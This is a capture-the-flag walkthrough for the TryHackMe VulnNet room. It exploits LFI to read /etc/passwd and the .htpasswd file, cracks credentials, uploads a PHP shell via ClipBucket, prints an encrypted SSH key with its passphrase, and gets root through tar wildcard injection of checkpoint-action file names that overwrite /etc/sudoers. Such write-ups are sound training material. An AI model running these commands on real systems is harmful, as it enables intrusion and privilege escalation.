# 71 - VulnNet (LFI, JS code review, tar \*)

Room Link --> [https://tryhackme.com/room/vulnnet1](https://tryhackme.com/room/vulnnet1)

You will have to add a machine IP with domain: `vulnnet.thm` to your /etc/hosts

### Enumeration

{% code overflow="wrap" %}
```bash
nmap -Pn -n -vv 10.10.33.25 -p- -sV -T5

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
```
{% endcode %}

Navigating to the webpage `http://vulnnet.thm` .

<figure><img src=".gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>

#### Gobuster Enumeration

{% code overflow="wrap" %}
```bash
gobuster dir -u http://vulnnet.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -b 403 -b 404

/css
/js
/img
/fonts
```
{% endcode %}

#### Subdomain Bruteforce / Discovery

{% code overflow="wrap" %}
```bash
ffuf -u http://vulnnet.thm -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.vulnnet.thm' -fs 5829

broadcast
```
{% endcode %}

This leads to an authentication page.

[http://broadcast.vulnnet.thm/](http://broadcast.vulnnet.thm/)

<figure><img src=".gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

But we don't have any credentials.&#x20;

I enumerated the JavaScript files in the JS dir, and found a parameter in the `index__d8338055.js` file:  --> \`[http://vulnnet.thm/index.php?referer=](http://vulnnet.thm/index.php?referer=)\`

<figure><img src=".gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

So i check for LFI and it worked:

[http://vulnnet.thm/index.php?referer=/etc/passwd](http://vulnnet.thm/index.php?referer=/etc/passwd)

<figure><img src=".gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

Back to the [http://broadcast.vulnnet.thm/](http://broadcast.vulnnet.thm/)

The page is using a Basic authentication

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can try to view the file that stores credentials for Basic Authentication on Ubuntu Apache, ie the `htpasswd` file. Located at `/etc/apache2/.htpasswd`&#x20;

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Reading the file and we see a credential:

`developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0` .

Cracking with John.

Cracked --> `developers :  9972761drmfsls` .

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Poceed to login to the page. And got a `Clipbucket CMS` .

So Google Exploit for ClipBucket v4.0 exploits, and saw a [FIle Upload Exploit](https://www.exploit-db.com/exploits/44250).

### Initial Access

#### Uploading malicious php file.

Using Curl

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ curl -F "file=@rev.php" -F "plupload=1" -F "name=rev.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u developers:9972761drmfsls
creating file{"success":"yes","file_name":"169989120868ca6d","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We naviigate to [http://broadcast.vulnnet.thm/actions/](http://broadcast.vulnnet.thm/actions/) There is a `CB_BEATS_UPLOAD_DIR`

We execute it and get shell.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Server-management user

There is a backup folder in the /var dir with some .gz files with Read privs on the, so we can download to kali and untar them.

{% code overflow="wrap" lineNumbers="true" %}
```bash
-rw-rw-r--  1 server-management server-management    1484 Jan 24  2021 ssh-backup.tar.gz
```
{% endcode %}

After untaring the file there is a `id_rsa` file.

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
```

We use `ssh2john` to crack the key password.

`oneTWO3gOyac`

```bash
┌──(dking㉿dking)-[~/Downloads]
└─$ ssh server-management@broadcast.vulnnet.thm -i id_rsa
```

Adnd am logged in.

### Priv Esc to Root

There is a cronjob running as root every 2 minutes.

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
server-management@vulnnet:/var/opt$ cat backupsrv.sh 
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest

```

Its backingup everything in the Documents dir and saving to /var/backups dir every 2 minutes.

We can exploit the `*` (wildcard) there.

However, to exploit the vulnerability, execute below commands in the **/home/server-management/Documents/**.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># we just add ourself to the /etc/sudoers file.
</strong><strong>echo 'echo "server-management ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > exploit.sh
</strong>echo "" > "--checkpoint-action=exec=sh exploit.sh"
echo "" > --checkpoint=1
</code></pre>

Now, wait 2 minutes, and execute `sudo /bin/bash` and your are **ROOT!**.

Done!

